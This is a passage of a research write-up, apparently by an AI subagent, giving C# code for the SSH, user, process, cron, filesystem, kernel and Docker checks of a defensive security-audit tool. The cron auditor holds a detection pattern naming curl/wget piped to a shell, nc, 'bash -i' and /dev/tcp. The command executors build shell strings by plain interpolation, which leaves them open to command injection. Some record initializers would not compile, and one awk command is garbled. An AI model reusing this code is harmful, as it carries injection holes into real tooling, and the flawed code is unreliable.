# SecKit v2 Expansion — Research Findings

> **Researcher**: SecKit v2 Researcher Subagent
> **Date**: 2026-08-02
> **Purpose**: Provide builders with technical research, NuGet packages, and code snippets for 8 SecKit v2 modules.

---

## Table of Contents

1. [Linux Server Hardening (C# via Process.Start / SSH.NET)](#1-linux-server-hardening)
2. [Docker Security Audit (from C#)](#2-docker-security-audit)
3. [Cloud Audit APIs](#3-cloud-audit-apis)
4. [JWT Security Testing in C#](#4-jwt-security-testing)
5. [Blazor Server Quick Start](#5-blazor-server-quick-start)
6. [WAF/IDS Rule Generation](#6-wafids-rule-generation)
7. [Agent/Background Service in .NET](#7-agentbackground-service)
8. [C# Process Execution Patterns](#8-c-process-execution-patterns)

---

## 1. Linux Server Hardening

### 1.1 NuGet Packages

```xml
<!-- SSH.NET for remote execution -->
<PackageReference Include="SSH.NET" Version="2024.2.0" />

<!-- For local execution, no extra packages needed — use System.Diagnostics.Process -->
```

### 1.2 Core Pattern: Local vs Remote Execution

```csharp
using System.Diagnostics;
using Renci.SshNet;

namespace SecKit.Core.Hardening;

/// <summary>
/// Unified executor that works locally or over SSH.
/// </summary>
public interface ICommandExecutor
{
    Task<CommandResult> ExecuteAsync(string command, bool useSudo = false);
    void Dispose();
}

public record CommandResult(int ExitCode, string Stdout, string Stderr);

// --- Local Executor ---
public class LocalCommandExecutor : ICommandExecutor
{
    public async Task<CommandResult> ExecuteAsync(string command, bool useSudo = false)
    {
        var psi = new ProcessStartInfo
        {
            FileName = "/bin/bash",
            Arguments = $"-c \"{(useSudo ? "sudo " : "")}{command}\"",
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            UseShellExecute = false,
            CreateNoWindow = true
        };

        using var proc = Process.Start(psi)!;
        var stdout = await proc.StandardOutput.ReadToEndAsync();
        var stderr = await proc.StandardError.ReadToEndAsync();
        await proc.WaitForExitAsync();

        return new CommandResult(proc.ExitCode, stdout, stderr);
    }

    public void Dispose() { }
}

// --- Remote SSH Executor ---
public class SshCommandExecutor : ICommandExecutor
{
    private readonly SshClient _client;

    public SshCommandExecutor(string host, string username, string passwordOrKeyPath)
    {
        AuthenticationMethod auth;
        if (File.Exists(passwordOrKeyPath))
        {
            var keyFile = new PrivateKeyFile(passwordOrKeyPath);
            auth = new PrivateKeyAuthenticationMethod(username, keyFile);
        }
        else
        {
            auth = new PasswordAuthenticationMethod(username, passwordOrKeyPath);
        }

        _client = new SshClient(new ConnectionInfo(host, 22, username, auth));
        _client.Connect();
    }

    public async Task<CommandResult> ExecuteAsync(string command, bool useSudo = false)
    {
        var fullCmd = useSudo
            ? $"echo '{command}' | sudo -S bash 2>&1"
            : command;

        using var cmd = _client.RunCommand(fullCmd);
        // SSH.NET RunCommand is synchronous internally, wrap for consistency
        await Task.Delay(1);

        return new CommandResult(
            cmd.ExitStatus,
            cmd.Result,
            cmd.Error
        );
    }

    public void Dispose() => _client.Dispose();
}
```

### 1.3 Handling Sudo Escalation Safely

**Key considerations:**
- Never store sudo passwords in source code
- Use `sudo -S` with password piped via stdin (from secure config)
- Alternatively, configure `sudoers` NOPASSWD for specific audit commands
- Always log every privileged command

```csharp
public class SudoHandler
{
    /// <summary>
    /// Execute a command with sudo. Password is read from secure config,
    /// never hardcoded.
    /// </summary>
    public async Task<CommandResult> SudoAsync(ICommandExecutor executor, string command)
    {
        // Approach 1: NOPASSWD (preferred for automation)
        // Add to /etc/sudoers.d/seckit:
        //   openclaw-agent ALL=(ALL) NOPASSWD: /usr/bin/auditctl, /usr/bin/ss, ...

        // Approach 2: Password via stdin (if NOPASSWD not available)
        // var fullCmd = $"echo '{SecureConfig.SudoPassword}' | sudo -S {command}";

        return await executor.ExecuteAsync(command, useSudo: true);
    }
}
```

### 1.4 Audit Commands & C# Wrappers

#### SSH Configuration Audit

```csharp
public class SshAuditor
{
    private readonly ICommandExecutor _executor;

    public SshAuditor(ICommandExecutor executor) => _executor = executor;

    public async Task<SshAuditResult> AuditAsync()
    {
        return new SshAuditResult
        {
            ConfigChecks = await CheckSshdConfig(),
            AuthorizedKeys = await ListAuthorizedKeys(),
            RootLoginAllowed = await CheckPermitRootLogin(),
            PasswordAuthAllowed = await CheckPasswordAuth(),
        };
    }

    // Check sshd config for security best practices
    private async Task<List<ConfigCheck>> CheckSshdConfig()
    {
        var checks = new List<ConfigCheck>();

        // Check PermitRootLogin
        var result = await _executor.ExecuteAsync(
            "grep -E '^PermitRootLogin' /etc/ssh/sshd_config || echo 'NOT_FOUND:using-default'");
        checks.Add(ParseConfigCheck("PermitRootLogin", "no", result.Stdout));

        // Check PasswordAuthentication
        result = await _executor.ExecuteAsync(
            "grep -E '^PasswordAuthentication' /etc/ssh/sshd_config || echo 'NOT_FOUND:using-default'");
        checks.Add(ParseConfigCheck("PasswordAuthentication", "no", result.Stdout));

        // Check Protocol version
        result = await _executor.ExecuteAsync(
            "grep -E '^Protocol' /etc/ssh/sshd_config || echo 'Protocol 2'");
        checks.Add(ParseConfigCheck("Protocol", "2", result.Stdout));

        // Check X11Forwarding
        result = await _executor.ExecuteAsync(
            "grep -E '^X11Forwarding' /etc/ssh/sshd_config || echo 'NOT_FOUND'");
        checks.Add(ParseConfigCheck("X11Forwarding", "no", result.Stdout));

        // Check MaxAuthTries
        result = await _executor.ExecuteAsync(
            "grep -E '^MaxAuthTries' /etc/ssh/sshd_config || echo 'MaxAuthTries 6'");
        checks.Add(ParseConfigCheck("MaxAuthTries", "3", result.Stdout, maxRecommended: false));

        // Check ClientAliveInterval
        result = await _executor.ExecuteAsync(
            "grep -E '^ClientAliveInterval' /etc/ssh/sshd_config || echo 'NOT_FOUND'");
        checks.Add(ParseConfigCheck("ClientAliveInterval", "300", result.Stdout));

        return checks;
    }

    private ConfigCheck ParseConfigCheck(string key, string recommended, string actual, bool maxRecommended = false)
    {
        if (actual.Contains("NOT_FOUND"))
            return new ConfigCheck(key, "not-set", recommended, Status: CheckStatus.Warning,
                Detail: "Setting not explicitly configured; using default.");

        var value = actual.Split(' ', StringSplitOptions.RemoveEmptyEntries).LastOrDefault()?.Trim() ?? "";
        bool compliant = maxRecommended
            ? int.TryParse(value, out var iv) && int.TryParse(recommended, out var rv) && iv <= rv
            : value.Equals(recommended, StringComparison.OrdinalIgnoreCase);

        return new ConfigCheck(key, value, recommended,
            compliant ? CheckStatus.Pass : CheckStatus.Fail,
            $"Expected '{recommended}', got '{value}'");
    }

    private async Task<List<string>> ListAuthorizedKeys()
    {
        var users = await ListHumanUsers();
        var keys = new List<string>();

        foreach (var user in users)
        {
            var result = await _executor.ExecuteAsync(
                $"sudo test -f /home/{user}/.ssh/authorized_keys && sudo wc -l /home/{user}/.ssh/authorized_keys || echo '0'");
            var count = result.Stdout.Trim().Split(' ').FirstOrDefault() ?? "0";
            keys.Add($"User '{user}': {count} authorized keys");
        }

        return keys;
    }

    private Task<CommandResult> CheckPermitRootLogin() =>
        _executor.ExecuteAsync("grep -E '^PermitRootLogin' /etc/ssh/sshd_config");

    private Task<CommandResult> CheckPasswordAuth() =>
        _executor.ExecuteAsync("grep -E '^PasswordAuthentication' /etc/ssh/sshd_config");

    private async Task<List<string>> ListHumanUsers()
    {
        // UIDs >= 1000 are human users, filter out nobody (65534)
        var result = await _executor.ExecuteAsync(
            "awk -F: '($3>=1000 && $3<65534) {print $1}' /etc/passwd");
        return result.Stdout.Split('\n', StringSplitOptions.RemoveEmptyEntries).ToList();
    }
}

public record SshAuditResult(
    List<ConfigCheck> ConfigChecks = null!,
    List<string> AuthorizedKeys = null!,
    CommandResult RootLoginAllowed = null!,
    CommandResult PasswordAuthAllowed = null!
);

public record ConfigCheck(string Key, string Actual, string Recommended, CheckStatus Status, string Detail);

public enum CheckStatus { Pass, Fail, Warning }
```

#### User & Group Audit

```csharp
public class UserAuditor
{
    private readonly ICommandExecutor _executor;

    public UserAuditor(ICommandExecutor executor) => _executor = executor;

    public async Task<UserAuditResult> AuditAsync()
    {
        return new UserAuditResult
        {
            UsersWithUid0 = await FindUsersWithUid0(),
            EmptyPasswords = await FindEmptyPasswords(),
            SudoersUsers = await ListSudoers(),
            Groups = await ListAllGroups(),
            RecentlyAddedUsers = await FindRecentlyAddedUsers(),
        };
    }

    /// Find all users with UID 0 (should only be root)
    private async Task<List<string>> FindUsersWithUid0()
    {
        var result = await _executor.ExecuteAsync(
            "awk -F: '($3==0) {print $1}' /etc/passwd");
        return result.Stdout.Split('\n', StringSplitOptions.RemoveEmptyEntries).ToList();
    }

    /// Check for accounts with empty passwords (shadow field empty or "!")
    private async Task<List<string>> FindEmptyPasswords()
    {
        var result = await _executor.ExecuteAsync(
            "sudo awk -F: '($2==\"\" || $2==\"!\") {print $1}' /etc/shadow");
        return result.Stdout.Split('\n', StringSplitOptions.RemoveEmptyEntries).ToList();
    }

    /// List users with sudo privileges
    private async Task<List<string>> ListSudoers()
    {
        var result = await _executor.ExecuteAsync(
            "grep -Po '^\\s*[^#]\\S+' /etc/sudoers /etc/sudoers.d/* 2>/dev/null | sort -u | grep -v '^$' | grep -v 'Defaults' | grep -v '^/'");
        return result.Stdout.Split('\n', StringSplitOptions.RemoveEmptyEntries)
            .Select(l => l.Trim())
            .Where(l => !string.IsNullOrEmpty(l) && !l.Contains('='))
            .ToList();
    }

    /// List groups with members
    private async Task<List<GroupInfo>> ListAllGroups()
    {
        var result = await _executor.ExecuteAsync(
            "getent group | awk -F: '{print $1\":\"$4}'");
        return result.Stdout.Split('\n', StringSplitOptions.RemoveEmptyEntries)
            .Select(line =>
            {
                var parts = line.Split(':');
                return new GroupInfo(
                    parts[0],
                    parts.Length > 1 ? parts[1].Split(',').Where(m => !string.IsNullOrEmpty(m)).ToList() : new()
                );
            })
            .Where(g => g.Members.Count > 0)
            .ToList();
    }

    /// Users added in last 30 days
    private async Task<List<string>> FindRecentlyAddedUsers()
    {
        var threshold = DateTime.UtcNow.AddDays(-30).ToString("yyyy-MM-dd");
        var result = await _executor.ExecuteAsync(
            $"sudo awk -F: -v date=\"{threshold}\" '{{cmd=\"sudo passwd -S \"$1\" 2>/dev/null | head -1\"; cmd | getline status; if (status ~ /^{{$1}}/) print $1}}' /etc/passwd 2>/dev/null");
        // Simpler approach: check lastlog
        var r2 = await _executor.ExecuteAsync(
            "sudo lastlog | grep -v 'Never logged in' | grep -v 'Username' | tail -20");
        return r2.Stdout.Split('\n', StringSplitOptions.RemoveEmptyEntries).ToList();
    }
}

public record UserAuditResult(
    List<string> UsersWithUid0,
    List<string> EmptyPasswords,
    List<string> SudoersUsers,
    List<GroupInfo> Groups,
    List<string> RecentlyAddedUsers
);

public record GroupInfo(string Name, List<string> Members);
```

#### Process Audit

```csharp
public class ProcessAuditor
{
    private readonly ICommandExecutor _executor;

    public ProcessAuditor(ICommandExecutor executor) => _executor = executor;

    public async Task<ProcessAuditResult> AuditAsync()
    {
        return new ProcessAuditResult
        {
            ListeningPorts = await ListListeningPorts(),
            RunningServices = await ListRunningServices(),
            SuspiciousProcesses = await FindSuspiciousProcesses(),
            CpuIntensiveProcesses = await GetTopCpuProcesses(),
        };
    }

    /// List all listening TCP/UDP ports with process info
    private async Task<List<PortInfo>> ListListeningPorts()
    {
        var result = await _executor.ExecuteAsync(
            "ss -tulnp 2>/dev/null | tail -n +2");
        return ParseSsOutput(result.Stdout);
    }

    private List<PortInfo> ParseSsOutput(string output)
    {
        var ports = new List<PortInfo>();
        foreach (var line in output.Split('\n', StringSplitOptions.RemoveEmptyEntries))
        {
            // Parse: tcp LISTEN 0 128 0.0.0.0:22 0.0.0.0:* users:(("sshd",pid=1234,fd=3))
            var parts = line.Split(' ', StringSplitOptions.RemoveEmptyEntries);
            if (parts.Length < 5) continue;

            var local = parts[4]; // 0.0.0.0:22 or [::]:22
            var processPart = parts.LastOrDefault(p => p.Contains("users:")) ?? "";

            var localParts = local.Split(':');
            var address = string.Join(":", localParts.Take(localParts.Length - 1));
            var port = localParts.LastOrDefault() ?? "";

            // Extract PID
            var pid = "";
            var process = "";
            var match = System.Text.RegularExpressions.Regex.Match(processPart, @"pid=(\d+)");
            if (match.Success)
            {
                pid = match.Groups[1].Value;
                var nameMatch = System.Text.RegularExpressions.Regex.Match(processPart, @"""([^""]+)""");
                if (nameMatch.Success) process = nameMatch.Groups[1].Value;
            }

            ports.Add(new PortInfo(parts[0], address, port, pid, process));
        }
        return ports;
    }

    /// List active systemd services
    private async Task<List<string>> ListRunningServices()
    {
        var result = await _executor.ExecuteAsync(
            "systemctl list-units --type=service --state=running --no-pager --no-legend | awk '{print $1}'");
        return result.Stdout.Split('\n', StringSplitOptions.RemoveEmptyEntries).ToList();
    }

    /// Find suspicious processes (e.g., processes running from /tmp, /dev/shm)
    private async Task<List<string>> FindSuspiciousProcesses()
    {
        var checks = new[]
        {
            "ps aux | grep -E '/tmp/|/dev/shm/' | grep -v grep",
            "ps aux | grep -E '\\.(pl|py|sh)$' | grep -v grep | head -5",
            "ps aux --sort=-%mem | head -10"
        };

        var results = new List<string>();
        foreach (var check in checks)
        {
            var result = await _executor.ExecuteAsync(check);
            if (!string.IsNullOrWhiteSpace(result.Stdout))
                results.Add(result.Stdout.Trim());
        }
        return results;
    }

    /// Top 10 processes by CPU usage
    private async Task<List<string>> GetTopCpuProcesses()
    {
        var result = await _executor.ExecuteAsync(
            "ps aux --sort=-%cpu | head -11");
        return result.Stdout.Split('\n', StringSplitOptions.RemoveEmptyEntries).ToList();
    }
}

public record ProcessAuditResult(
    List<PortInfo> ListeningPorts,
    List<string> RunningServices,
    List<string> SuspiciousProcesses,
    List<string> CpuIntensiveProcesses
);

public record PortInfo(string Protocol, string Address, string Port, string Pid, string ProcessName);
```

#### Cron Job Audit

```csharp
public class CronAuditor
{
    private readonly ICommandExecutor _executor;

    public CronAuditor(ICommandExecutor executor) => _executor = executor;

    public async Task<CronAuditResult> AuditAsync()
    {
        return new CronAuditResult
        {
            SystemCrontabs = await ListSystemCrontabs(),
            UserCrontabs = await ListAllUserCrontabs(),
            CronDotD = await ListCronDotD(),
            AnacronJobs = await ListAnacronJobs(),
            AtJobs = await ListAtJobs(),
            SuspiciousEntries = await FindSuspiciousCronEntries(),
        };
    }

    private async Task<List<string>> ListSystemCrontabs()
    {
        var result = await _executor.ExecuteAsync(
            "sudo cat /etc/crontab 2>/dev/null | grep -v '^#' | grep -v '^$' || echo 'No /etc/crontab'");
        return result.Stdout.Split('\n', StringSplitOptions.RemoveEmptyEntries).ToList();
    }

    private async Task<List<string>> ListAllUserCrontabs()
    {
        var users = await GetHumanUsers();
        var allCrons = new List<string>();
        foreach (var user in users)
        {
            var result = await _executor.ExecuteAsync(
                $"sudo crontab -u {user} -l 2>/dev/null || echo '{user}: no crontab'");
            if (!result.Stdout.Contains("no crontab"))
                allCrons.Add($"--- {user}'s crontab ---\n{result.Stdout}");
        }
        return allCrons;
    }

    private async Task<List<string>> ListCronDotD()
    {
        var checks = new[] { "/etc/cron.d", "/etc/cron.daily", "/etc/cron.hourly", "/etc/cron.weekly", "/etc/cron.monthly" };
        var results = new List<string>();
        foreach (var dir in checks)
        {
            var result = await _executor.ExecuteAsync(
                $"sudo ls -la {dir}/ 2>/dev/null || echo '{dir}: not found or empty'");
            if (!result.Stdout.Contains("not found"))
                results.Add($"--- {dir} ---\n{result.Stdout}");
        }
        return results;
    }

    private async Task<List<string>> ListAnacronJobs()
    {
        var result = await _executor.ExecuteAsync(
            "sudo cat /etc/anacrontab 2>/dev/null | grep -v '^#' | grep -v '^$' || echo 'No anacrontab'");
        return result.Stdout.Split('\n', StringSplitOptions.RemoveEmptyEntries).ToList();
    }

    private async Task<List<string>> ListAtJobs()
    {
        var result = await _executor.ExecuteAsync("atq 2>/dev/null || echo 'atq not available'");
        return result.Stdout.Split('\n', StringSplitOptions.RemoveEmptyEntries).ToList();
    }

    /// Find cron entries that download and execute, use curl/wget with pipe to shell, etc.
    private async Task<List<string>> FindSuspiciousCronEntries()
    {
        var result = await _executor.ExecuteAsync(
            "sudo grep -rE '(curl|wget).*\\|.*(sh|bash|python|perl)|nc |bash -i|/dev/tcp/' /etc/cron* /var/spool/cron/ 2>/dev/null");
        return result.Stdout.Split('\n', StringSplitOptions.RemoveEmptyEntries).ToList();
    }

    private async Task<List<string>> GetHumanUsers()
    {
        var result = await _executor.ExecuteAsync(
            "awk -F: '($3>=1000 && $3<65534) {print $1}' /etc/passwd");
        return result.Stdout.Split('\n', StringSplitOptions.RemoveEmptyEntries).ToList();
    }
}

public record CronAuditResult(
    List<string> SystemCrontabs,
    List<string> UserCrontabs,
    List<string> CronDotD,
    List<string> AnacronJobs,
    List<string> AtJobs,
    List<string> SuspiciousEntries
);
```

#### Filesystem Permission Audit

```csharp
public class FilesystemAuditor
{
    private readonly ICommandExecutor _executor;

    public FilesystemAuditor(ICommandExecutor executor) => _executor = executor;

    public async Task<FilesystemAuditResult> AuditAsync()
    {
        return new FilesystemAuditResult
        {
            WorldWritableFiles = await FindWorldWritableFiles(),
            WorldWritableDirs = await FindWorldWritableDirs(),
            SuidBinaries = await FindSuidBinaries(),
            SgidBinaries = await FindSgidBinaries(),
            NoOwnerFiles = await FindNoOwnerFiles(),
            DotFilePermissions = await CheckDotFilePermissions(),
            MountOptions = await CheckMountOptions(),
        };
    }

    /// Find world-writable files (excluding /proc, /sys, /dev)
    private async Task<List<string>> FindWorldWritableFiles(int limit = 50)
    {
        var result = await _executor.ExecuteAsync(
            $"sudo find / -type f -perm -o+w -not -path '/proc/*' -not -path '/sys/*' -not -path '/dev/*' 2>/dev/null | head -{limit}");
        return result.Stdout.Split('\n', StringSplitOptions.RemoveEmptyEntries).ToList();
    }

    /// Find world-writable directories (sticky bit check)
    private async Task<List<string>> FindWorldWritableDirs(int limit = 30)
    {
        var result = await _executor.ExecuteAsync(
            $"sudo find / -type d -perm -o+w -not -perm -o+t -not -path '/proc/*' -not -path '/sys/*' 2>/dev/null | head -{limit}");
        return result.Stdout.Split('\n', StringSplitOptions.RemoveEmptyEntries).ToList();
    }

    /// Find SUID binaries (potential privilege escalation vectors)
    private async Task<List<SuidBinary>> FindSuidBinaries()
    {
        var result = await _executor.ExecuteAsync(
            "sudo find / -type f -perm -4000 -not -path '/proc/*' -not -path '/sys/*' 2>/dev/null | xargs ls -la 2>/dev/null");
        return result.Stdout.Split('\n', StringSplitOptions.RemoveEmptyEntries)
            .Select(ParseLsLine)
            .Where(b => b != null)
            .Cast<SuidBinary>()
            .ToList();
    }

    /// Find SGID binaries
    private async Task<List<SuidBinary>> FindSgidBinaries()
    {
        var result = await _executor.ExecuteAsync(
            "sudo find / -type f -perm -2000 -not -path '/proc/*' -not -path '/sys/*' 2>/dev/null | xargs ls -la 2>/dev/null");
        return result.Stdout.Split('\n', StringSplitOptions.RemoveEmptyEntries)
            .Select(ParseLsLine)
            .Where(b => b != null)
            .Cast<SuidBinary>()
            .ToList();
    }

    /// Files with no valid owner (deleted user)
    private async Task<List<string>> FindNoOwnerFiles()
    {
        var result = await _executor.ExecuteAsync(
            "sudo find / -nouser -not -path '/proc/*' -not -path '/sys/*' 2>/dev/null | head -20");
        return result.Stdout.Split('\n', StringSplitOptions.RemoveEmptyEntries).ToList();
    }

    /// Check .ssh, .bash_history, .gitconfig for overly permissive permissions
    private async Task<List<string>> CheckDotFilePermissions()
    {
        var result = await _executor.ExecuteAsync(
            "sudo find /home -name '.ssh' -type d -perm /o+rwx 2>/dev/null; " +
            "sudo find /home -name '.bash_history' -perm /o+r 2>/dev/null");
        return result.Stdout.Split('\n', StringSplitOptions.RemoveEmptyEntries).ToList();
    }

    /// Check mount options (noexec, nosuid, nodev on /tmp, /var/tmp, /dev/shm)
    private async Task<List<MountCheck>> CheckMountOptions()
    {
        var result = await _executor.ExecuteAsync("mount | grep -E '/tmp|/var/tmp|/dev/shm|/home'");
        var checks = new List<MountCheck>();

        foreach (var line in result.Stdout.Split('\n', StringSplitOptions.RemoveEmptyEntries))
        {
            var parts = line.Split(' ', StringSplitOptions.RemoveEmptyEntries);
            if (parts.Length < 3) continue;

            var mountPoint = parts[2];
            var options = parts.Length > 5 ? parts[5].Trim('(', ')') : "";

            var expected = mountPoint switch
            {
                "/tmp" or "/var/tmp" => new[] { "noexec", "nosuid", "nodev" },
                "/dev/shm" => new[] { "noexec", "nosuid" },
                "/home" => new[] { "nosuid" },
                _ => Array.Empty<string>()
            };

            foreach (var opt in expected)
            {
                checks.Add(new MountCheck(mountPoint, opt,
                    options.Contains(opt) ? CheckStatus.Pass : CheckStatus.Fail));
            }
        }

        return checks;
    }

    private SuidBinary? ParseLsLine(string line)
    {
        var parts = line.Split(' ', StringSplitOptions.RemoveEmptyEntries);
        if (parts.Length < 9) return null;

        return new SuidBinary(
            parts[0], // permissions
            parts[2], // owner
            parts[3], // group
            string.Join(" ", parts.Skip(8)) // filename
        );
    }
}

public record FilesystemAuditResult(
    List<string> WorldWritableFiles,
    List<string> WorldWritableDirs,
    List<SuidBinary> SuidBinaries,
    List<SuidBinary> SgidBinaries,
    List<string> NoOwnerFiles,
    List<string> DotFilePermissions,
    List<MountCheck> MountOptions
);

public record SuidBinary(string Permissions, string Owner, string Group, string Path);
public record MountCheck(string MountPoint, string Option, CheckStatus Status);
```

### 1.5 Kernel Hardening Checks

```csharp
public class KernelHardeningAuditor
{
    private readonly ICommandExecutor _executor;

    public KernelHardeningAuditor(ICommandExecutor executor) => _executor = executor;

    public async Task<Dictionary<string, string>> CheckSysctlSettings()
    {
        var checks = new Dictionary<string, string>
        {
            ["net.ipv4.ip_forward"] = "0",
            ["net.ipv4.conf.all.send_redirects"] = "0",
            ["net.ipv4.conf.all.accept_source_route"] = "0",
            ["net.ipv4.conf.all.accept_redirects"] = "0",
            ["net.ipv4.conf.all.secure_redirects"] = "0",
            ["net.ipv4.conf.all.log_martians"] = "1",
            ["net.ipv4.icmp_echo_ignore_broadcasts"] = "1",
            ["net.ipv4.icmp_ignore_bogus_error_responses"] = "1",
            ["net.ipv4.tcp_syncookies"] = "1",
            ["net.ipv6.conf.all.accept_redirects"] = "0",
            ["kernel.randomize_va_space"] = "2",
            ["kernel.kptr_restrict"] = "2",
            ["kernel.dmesg_restrict"] = "1",
            ["kernel.yama.ptrace_scope"] = "1",
            ["fs.suid_dumpable"] = "0",
        };

        var results = new Dictionary<string, string>();
        foreach (var (key, expected) in checks)
        {
            var result = await _executor.ExecuteAsync($"sysctl -n {key} 2>/dev/null || echo 'UNKNOWN'");
            results[key] = result.Stdout.Trim();
        }
        return results;
    }
}
```

---

## 2. Docker Security Audit

### 2.1 NuGet Package

```xml
<PackageReference Include="Docker.DotNet" Version="3.125.15" />
```

### 2.2 Docker.DotNet Client Setup

```csharp
using Docker.DotNet;
using Docker.DotNet.Models;

namespace SecKit.Core.Docker;

public class DockerSecurityAuditor : IDisposable
{
    private readonly DockerClient _client;

    /// <summary>
    /// Connect to local Docker daemon via Unix socket (Linux) or named pipe (Windows).
    /// </summary>
    public DockerSecurityAuditor()
    {
        var uri = OperatingSystem.IsWindows()
            ? new Uri("npipe://./pipe/docker_engine")
            : new Uri("unix:///var/run/docker.sock");

        _client = new DockerClientConfiguration(uri).CreateClient();
    }

    public void Dispose() => _client.Dispose();
```

### 2.3 List All Containers & Inspect for Security Issues

```csharp
    /// <summary>
    /// Audit all containers for security misconfigurations.
    /// </summary>
    public async Task<List<ContainerSecurityFinding>> AuditContainersAsync()
    {
        var findings = new List<ContainerSecurityFinding>();

        var containers = await _client.Containers.ListContainersAsync(
            new ContainersListParameters { All = true });

        foreach (var container in containers)
        {
            var inspect = await _client.Containers.InspectContainerAsync(container.ID);

            // Check 1: Privileged mode
            if (inspect.HostConfig.Privileged)
            {
                findings.Add(new ContainerSecurityFinding(
                    container.ID,
                    container.Names.FirstOrDefault() ?? "unknown",
                    "Privileged Mode",
                    Severity.Critical,
                    "Container is running with --privileged flag. This grants all capabilities and disables all security restrictions.",
                    "Remove --privileged and add only necessary --cap-add flags."
                ));
            }

            // Check 2: Dangerous capabilities
            var dangerousCaps = new[] { "SYS_ADMIN", "NET_ADMIN", "SYS_PTRACE", "SYS_MODULE",
                "DAC_OVERRIDE", "DAC_READ_SEARCH", "NET_RAW", "SYS_RAWIO" };
            foreach (var cap in dangerousCaps)
            {
                if (inspect.HostConfig.CapAdd?.Contains(cap) == true)
                {
                    findings.Add(new ContainerSecurityFinding(
                        container.ID, container.Names.FirstOrDefault() ?? "unknown",
                        $"Dangerous Capability: {cap}",
                        Severity.High,
                        $"Container has {cap} capability added, which can lead to container escape.",
                        $"Remove --cap-add={cap} unless absolutely necessary."
                    ));
                }
            }

            // Check 3: Host mounts (sensitive paths)
            var sensitivePaths = new[] { "/", "/etc", "/var/run/docker.sock", "/proc", "/sys",
                "/root", "/home", "/boot" };
            foreach (var mount in inspect.HostConfig.Binds ?? Enumerable.Empty<string>())
            {
                var hostPath = mount.Split(':')[0];
                foreach (var sensitive in sensitivePaths)
                {
                    if (hostPath.StartsWith(sensitive))
                    {
                        findings.Add(new ContainerSecurityFinding(
                            container.ID, container.Names.FirstOrDefault() ?? "unknown",
                            $"Sensitive Host Mount: {hostPath}",
                            Severity.High,
                            $"Container mounts sensitive host path: {hostPath}",
                            "Remove this bind mount or restrict to read-only (:ro)."
                        ));
                        break;
                    }
                }
            }

            // Check 4: Read-only root filesystem
            if (!inspect.HostConfig.ReadonlyRootfs)
            {
                findings.Add(new ContainerSecurityFinding(
                    container.ID, container.Names.FirstOrDefault() ?? "unknown",
                    "Writable Root Filesystem",
                    Severity.Medium,
                    "Container root filesystem is writable.",
                    "Add --read-only to the container and use tmpfs for writable paths."
                ));
            }

            // Check 5: Docker socket mounted
            var dockerSockMount = inspect.HostConfig.Binds?.Any(b =>
                b.Contains("/var/run/docker.sock")) ?? false;
            if (dockerSockMount)
            {
                findings.Add(new ContainerSecurityFinding(
                    container.ID, container.Names.FirstOrDefault() ?? "unknown",
                    "Docker Socket Mounted",
                    Severity.Critical,
                    "Docker socket (/var/run/docker.sock) is mounted into the container — this is effectively root access to the host.",
                    "NEVER mount the Docker socket into a container unless it's a management container with strict access controls."
                ));
            }

            // Check 6: Network mode = host
            if (inspect.HostConfig.NetworkMode == "host")
            {
                findings.Add(new ContainerSecurityFinding(
                    container.ID, container.Names.FirstOrDefault() ?? "unknown",
                    "Host Network Mode",
                    Severity.High,
                    "Container uses --network=host, sharing the host's network namespace.",
                    "Use bridge or overlay networks instead."
                ));
            }

            // Check 7: PID mode = host
            if (!string.IsNullOrEmpty(inspect.HostConfig.PidMode) &&
                inspect.HostConfig.PidMode == "host")
            {
                findings.Add(new ContainerSecurityFinding(
                    container.ID, container.Names.FirstOrDefault() ?? "unknown",
                    "Host PID Namespace",
                    Severity.High,
                    "Container shares host PID namespace (--pid=host).",
                    "Remove --pid=host unless absolutely needed for monitoring."
                ));
            }

            // Check 8: No memory/CPU limits
            if (inspect.HostConfig.Memory == 0)
            {
                findings.Add(new ContainerSecurityFinding(
                    container.ID, container.Names.FirstOrDefault() ?? "unknown",
                    "No Memory Limit",
                    Severity.Low,
                    "Container has no memory limit set — could cause host DoS.",
                    "Add --memory=<limit> to the container."
                ));
            }

            // Check 9: Exposed ports vs published ports
            foreach (var port in inspect.HostConfig.PortBindings ?? new Dictionary<string, IList<PortBinding>>())
            {
                if (port.Key.Contains("22") || port.Key.Contains("3389") || port.Key.Contains("5432"))
                {
                    findings.Add(new ContainerSecurityFinding(
                        container.ID, container.Names.FirstOrDefault() ?? "unknown",
                        $"Sensitive Port Published: {port.Key}",
                        Severity.Medium,
                        $"Container exposes sensitive port {port.Key} to the host.",
                        "Only publish ports that need external access."
                    ));
                }
            }
        }

        return findings;
    }
```

### 2.4 Audit Docker Images

```csharp
    /// <summary>
    /// Audit images for security issues.
    /// </summary>
    public async Task<List<ImageSecurityFinding>> AuditImagesAsync()
    {
        var findings = new List<ImageSecurityFinding>();

        var images = await _client.Images.ListImagesAsync(
            new ImagesListParameters { All = true });

        foreach (var image in images)
        {
            var inspect = await _client.Images.InspectImageAsync(image.ID);

            // Check: Image running as root (USER not set)
            // Note: Config.User is empty if USER not specified in Dockerfile
            if (string.IsNullOrEmpty(inspect.Config.User) || inspect.Config.User == "root" || inspect.Config.User == "0")
            {
                findings.Add(new ImageSecurityFinding(
                    image.ID,
                    image.RepoTags?.FirstOrDefault() ?? "<none>",
                    "Runs as Root",
                    Severity.High,
                    "Image default user is root.",
                    "Add 'USER 1000' or similar to the Dockerfile."
                ));
            }

            // Check: Exposed ports
            foreach (var port in inspect.Config.ExposedPorts ?? new Dictionary<string, EmptyStruct>())
            {
                findings.Add(new ImageSecurityFinding(
                    image.ID, image.RepoTags?.FirstOrDefault() ?? "<none>",
                    $"Exposed Port: {port.Key}",
                    Severity.Info,
                    $"Image exposes port {port.Key}.",
                    "Only expose ports that are actually needed."
                ));
            }

            // Check: Environment variables that might contain secrets
            var secretKeys = new[] { "PASSWORD", "SECRET", "KEY", "TOKEN", "CREDENTIAL", "API_KEY" };
            foreach (var env in inspect.Config.Env ?? Enumerable.Empty<string>())
            {
                var key = env.Split('=')[0].ToUpper();
                if (secretKeys.Any(s => key.Contains(s)))
                {
                    findings.Add(new ImageSecurityFinding(
                        image.ID, image.RepoTags?.FirstOrDefault() ?? "<none>",
                        $"Hardcoded Secret in ENV: {key}",
                        Severity.High,
                        $"Environment variable '{key}' may contain a secret.",
                        "Use Docker secrets, Kubernetes secrets, or external vault."
                    ));
                }
            }
        }

        return findings;
    }
```

### 2.5 Docker Daemon Configuration Audit

```csharp
    /// <summary>
    /// Audit Docker daemon configuration.
    /// </summary>
    public async Task<DockerDaemonAudit> AuditDaemonAsync()
    {
        var audit = new DockerDaemonAudit();

        // Check Docker info
